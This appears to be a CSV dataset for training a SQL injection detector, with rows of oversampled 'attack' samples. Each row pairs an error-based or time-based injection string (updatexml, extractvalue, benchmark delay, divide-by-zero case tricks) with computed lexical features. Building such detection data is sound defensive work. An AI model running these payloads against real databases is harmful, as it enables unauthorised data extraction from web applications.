id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000174,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",nearest_attack_euclidean,R000145,0.0071941205725332006,183.95424353619055,28.993463362312934,3.6362816157414857,44.0098049565306,38.98692672462587,74.96731681156467,25.9901950434694,0.23925247430975854,0.21193666941878928,0.4075261517939133,0.14128470447753885,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.993463362312934,2.7755575615628914e-17,0.0,5.996731681156467,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000175,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.6993199879082553,160.60463986218,31.6744200172275,3.814333924749749,57.953479896635,23.662789991386248,59.98836997415875,19.0,0.3599514052765562,0.14753059364971072,0.37394322827780613,0.1185747727959269,1.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000077,0.9770371782603703,138.95538856359727,27.591077712719454,3.552830287110692,56.0,11.591077712719454,58.18215542543891,13.182155425438907,0.4031340342322983,0.08337908295422798,0.4187169373036424,0.09476994550983125,0.5910777127194538,0.0,0.0,1.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,0.5910777127194535,2.0,0.5910777127194538,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000177,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000161,0.14599343420357425,138.06635157383337,24.06635157383338,3.5821695911961227,36.0,35.0,51.0,16.06635157383338,0.2607450392733812,0.25350212151578727,0.36938880563729004,0.11636403357354147,0.06635157383337975,0.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.0,1.0,0.06635157383337986,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000178,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000200,0.16225407859294427,190.0,26.85766424916956,3.42540233830462,36.42700725249132,46.43065699667824,83.28467150166088,23.85766424916956,0.1917210908025859,0.24437187892988546,0.438340376324531,0.12556665394299768,0.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,2.7755575615628914e-17,0.0,5.85766424916956,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000179,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000159,0.004201102471640767,133.0,28.0,3.728571742830451,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000180,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000293,0.06034439393752294,191.77256384293207,31.97157048036651,3.6707507224934908,48.97157048036651,39.886281921466036,78.92892620091628,23.985785240183255,0.2553765951682853,0.20795642682304086,0.4115862123278968,0.12508076568077697,0.0,0.0,2.0,0.0,1.0,1.985785240183255,0.0,14.0,2.7755575615628914e-17,0.0,4.0,4.9857852401832545,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.985785240183255,1.0,0.985785240183255,0.014214759816745082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.9857852401832545
SMOTE_000181,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000126,0.07008047013480277,160.61101608011893,32.0,3.6405488558325763,50.0,23.0,67.67584673343245,19.93516934668649,0.3113697609735317,0.1432300900478246,0.42128734964502634,0.12411279933361732,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.93516934668649,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,error,"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000175,0.42246096294611546,164.04863229066697,30.0,3.8454544388834875,39.868599518769365,47.0,56.868599518769365,20.31143325312823,0.24274305982506336,0.28687551598044264,0.3465065443286277,0.12387487986586623,0.0,0.0,2.0,0.0,0.0,2.0,0.0,10.311433253128227,2.7755575615628914e-17,0.0,6.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000183,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000240,0.0012666664273723875,133.0,28.0,3.7274730611945204,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000184,attack,error,"1'  )   where 1093  =  1093 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000119,0.264033334911017,167.0,31.0,3.8184168317756657,41.24798973287652,44.00268035616464,60.49865982191768,21.25067008904116,0.24699395049626657,0.26348910392912955,0.3622674240833394,0.12724952149126442,1.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,5.25067008904116,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000185,attack,error,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",nearest_attack_euclidean,R000299,0.9915126126070746,158.23537750028973,27.0,3.6954499561728036,37.27061325008692,37.305848999884105,59.23537750028973,24.423537750028974,0.23547675207883095,0.23637634714407874,0.37374494664747715,0.1544019541296131,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.847075500057946,2.0,0.0,5.576462249971027,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000186,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",nearest_attack_euclidean,R000222,0.49991062555011945,166.17626730290823,27.82373269709176,3.704617821924234,36.70506921163296,46.29493078836704,63.35253460581648,19.82373269709176,0.22086053914675616,0.27861171443735094,0.38122847934789394,0.11929926706799897,0.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.823732697091761,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1762673029082393,0.8237326970917607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000187,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",nearest_attack_euclidean,R000045,0.6606000150491029,166.76420896780579,25.707373096582653,3.6435100413137405,36.76420896780578,47.0,63.0,20.0,0.22045116390645522,0.2818368868953585,0.3777813590299486,0.11993059016823766,0.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,6.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.7642089678057813,0.23579103219421838,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000188,attack,error,"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000057,0.0328073184841249,166.3482300196868,29.023215334645787,3.744108828277663,41.069646003937365,43.09286133858315,61.13929200787472,21.046430669291574,0.24689755061726826,0.2590508251134351,0.3675324649572758,0.12651915931202085,1.0,0.0,2.0,0.0,0.0,2.0,0.0,11.023215334645787,2.7755575615628914e-17,0.0,5.023215334645787,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,error,"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000221,0.3677901660602566,171.7980813274316,33.153108202858306,3.880047051323501,45.98372984342997,43.0,61.98372984342997,20.83062164057166,0.2674969361878893,0.2505062648290298,0.3607085696126445,0.12128822937043642,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.830621640571662,2.7755575615628914e-17,0.0,5.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000190,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000116,0.7183424259260729,187.0,32.91189437133854,3.9239868302402163,48.26431688598437,46.64757748535417,66.0,26.088105628661456,0.2580979512619485,0.24945228601793676,0.35294117647058826,0.1395085862495265,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.911894371338543,4.1762112573229135,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0881056286614569,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000191,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000099,0.22383126083149935,147.82738823154068,32.0,3.798318476721811,50.0,23.0,57.06191058523254,17.765477646308135,0.33830306620166695,0.15561941045276678,0.3859170469691596,0.1201604763764066,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.765477646308135,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000174,0.0388620956860548,174.98221721655415,26.982217216554155,3.4008584652321194,43.0,32.0,77.0,22.982217216554155,0.24573939769090875,0.18287583083974604,0.4400449679581389,0.13133980351120628,0.9822172165541547,0.0,0.0,0.0,1.0,1.0,0.0,15.0,2.7755575615628914e-17,0.0,4.0,2.0,0.9822172165541545,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000193,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000146,1.3599955583311654,184.26743901225916,27.56976718293265,3.463880444302136,38.279068731730604,36.720931268269396,80.69767182932651,28.56976718293265,0.20759902591423568,0.19977693491094006,0.4375223726205541,0.1551016665542701,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,15.139534365865302,2.0,0.0,5.430232817067349,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.5697671829326507,0.4302328170673493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000194,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop",nearest_attack_euclidean,R000030,0.49258641836288874,170.0,28.436383774161968,3.7469244247585176,45.3091513224859,37.25446490335212,63.872767548323935,23.563616225838032,0.2665244195440348,0.21914391119618895,0.37572216204896436,0.13860950721081194,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.563616225838031,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000195,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",nearest_attack_euclidean,R000244,1.0172960224060021,165.06442172978234,30.0,3.8591067850128207,47.460401975434756,36.84160790173904,58.84160790173904,21.92080395086952,0.2877425619433403,0.22304102718332836,0.35646875824856183,0.1327476526247695,0.0,3.999999999999999,0.0,0.0,0.0,1.539598024565241,0.0,10.920803950869518,2.7755575615628914e-17,0.0,5.460401975434759,1.5395980245652412,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000196,attack,error,"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000213,0.35425586303474854,169.83553313636133,36.0,3.9194674253761184,55.0,31.0,64.0,19.835533136361338,0.3238442630525627,0.18253040281144442,0.37683696064298206,0.11678837349301081,0.8355331363613387,0.0,0.0,0.0,0.0,1.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,1.0,0.8355331363613387,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000197,attack,error,"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000213,0.07683309608953105,169.80603537234686,36.0,3.9205860651023916,55.0,31.0,63.870690248231234,19.935345124115617,0.3239120536054851,0.18256861203218247,0.3761273700993225,0.11739196426300996,0.9676725620578078,0.0,0.0,0.0,0.0,1.0,0.0,12.967672562057809,2.7755575615628914e-17,0.0,4.0,1.0,0.9676725620578077,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000198,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",nearest_attack_euclidean,R000053,0.5731847986700463,171.0,29.221966547595617,3.809077272137539,49.16705017860658,37.443933095191234,61.77803345240439,22.610983273797807,0.2875266092316174,0.21897036897772648,0.36127504942926536,0.1322279723613907,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,12.0,2.7755575615628914e-17,0.0,5.610983273797808,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000199,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000249,0.1236901601025722,140.64742796416792,27.0,3.6913925996190677,37.0,35.0,51.51794237133433,17.129485592833582,0.263105673168758,0.24888374488936568,0.3662311874785341,0.12177939446334221,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.129485592833582,2.7755575615628914e-17,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.5851876614559144,173.84325956990753,27.274518540707682,3.6381388537500894,46.17644437787696,36.09807416283072,67.7451854070768,23.823555622123042,0.2662200237996621,0.20754982489560292,0.3892861140396121,0.1369440372651229,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.54903708141536,2.7755575615628914e-17,0.0,5.27451854070768,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
